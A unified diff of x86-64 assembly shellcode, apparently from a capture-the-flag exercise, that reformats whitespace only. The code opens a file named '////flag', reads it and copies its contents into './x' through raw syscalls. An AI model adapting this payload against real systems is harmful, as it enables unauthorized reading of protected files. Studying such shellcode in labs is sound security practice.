@@ -28,8 +28,8 @@ pop_buf:
     mov rbx, 0x67616c662f2f2f2f
     push rbx
     mov rdi, rsp                # "////flag"
-    xor rsi, rsi        	    # O_RDONLY
-    mov al, 2          		    # open
+    xor rsi, rsi                # O_RDONLY
+    mov al, 2                   # open
     syscall
 
     # len = read(fd_in, buf, 1000)
@@ -40,7 +40,7 @@ pop_buf:
     xor rax, rax		        # read
     syscall
 
-    mov r13, rax        	    # save len
+    mov r13, rax                # save len
 
     # fd_out = open("./x", O_WRONLY | O_CREAT | O_TRUNC, 0644)
     xor rax, rax
@@ -48,24 +48,24 @@ pop_buf:
     push rbx
     mov rdi, rsp                # ".//x"
     xor rsi, rsi
-    mov si, 577			        # O_WRONLY | O_CREAT | O_TRUNC
+    mov si, 577                 # O_WRONLY | O_CREAT | O_TRUNC
     xor rdx, rdx
-    mov dx, 0644		        # 0644
-    mov al, 2			        # open
+    mov dx, 0644                # 0644
+    mov al, 2                   # open
     syscall
 
     # write(fd_out, buf, len)
-    mov rdi, rax		        # fd_out
+    mov rdi, rax                # fd_out
     xor rax, rax
-    mov rsi, r12		        # buf
-    mov rdx, r13		        # len
-    mov al, 1          		    # write
+    mov rsi, r12                # buf
+    mov rdx, r13                # len
+    mov al, 1                   # write
     syscall
 
     # exit(0)
     xor rax, rax
-    xor rdi, rdi		        # 0
-    mov al, 60         		    # exit
+    xor rdi, rdi                # 0
+    mov al, 60                  # exit
     syscall
 
 get_buf:
